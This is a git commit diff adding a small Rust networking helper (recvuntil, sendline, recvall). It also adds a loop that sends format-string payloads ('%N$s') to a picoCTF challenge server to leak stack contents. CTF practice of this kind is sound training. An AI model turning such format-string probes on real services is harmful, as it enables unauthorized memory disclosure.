4afe338be4a30f40de75c892bbe57e65992cbfbc
Dany Gagnon <danygagnon@Danys-MacBook-Pro.local>
2023-06-13 22:33:48 -0400

    feat: add the support for remote streams

--- core/lib.rs
+++ core/lib.rs
@@ -1,3 +1,4 @@
 pub mod pattern;
+pub mod tubes;
 
 pub use pattern::{find_pattern_start, parse_signature};
--- src/main.rs
+++ src/main.rs
@@ -1,13 +1,56 @@
-use core::{find_pattern_start, parse_signature};
+use tokio::io::{AsyncReadExt, AsyncWriteExt, BufReader};
+use tokio::net::TcpStream;
 
-fn main() {
-    let signature = "FF??D0??FF";
-    let pattern = parse_signature(signature);
+#[tokio::main]
+async fn main() -> Result<(), Box<dyn std::error::Error>> {
+    for i in 0..30 {
+        let mut remote = Remote::new("saturn.picoctf.net", 50451).await?;
+        remote.recvuntil(">> ").await?;
+        let payload = format!("%{}$s", i);
+        println!("{}", payload);
+        remote.sendline(&payload).await?;
+        let res = remote.recvall().await?;
+        // Print as string if it is valid UTF-8, otherwise print bytes
+        match String::from_utf8(res.clone()) {
+            Ok(v) => println!("{}", v),
+            Err(_e) => println!("{:?}", res),
+        }
+    }
+    Ok(())
+}
 
-    println!("{:?}", pattern);
+pub struct Remote {
+    stream: BufReader<TcpStream>,
+}
 
-    let data: Vec<u8> = vec![0xFF, 0x12, 0xD0, 0x34, 0xFF];
+impl Remote {
+    pub async fn new(address: &str, port: u16) -> Result<Remote, Box<dyn std::error::Error>> {
+        let addr = format!("{}:{}", address, port);
+        let stream = TcpStream::connect(&addr).await?;
+        Ok(Remote {
+            stream: BufReader::new(stream),
+        })
+    }
 
-    println!("{:?}", find_pattern_start(&data, &pattern));
-    println!("Hello, world");
+    pub async fn recvuntil(&mut self, pattern: &str) -> Result<String, Box<dyn std::error::Error>> {
+        let mut buffer = String::new();
+        while !buffer.ends_with(pattern) {
+            buffer.push(self.stream.read_u8().await? as char);
+        }
+        Ok(buffer)
+    }
+
+    pub async fn sendline(&mut self, data: &str) -> Result<(), Box<dyn std::error::Error>> {
+        self.stream
+            .get_mut()
+            .write_all(format!("{}\n", data).as_bytes())
+            .await?;
+        Ok(())
+    }
+
+    pub async fn recvall(&mut self) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
+        let mut buffer = Vec::new();
+        self.stream.read_to_end(&mut buffer).await?;
+        Ok(buffer)
+    }
 }
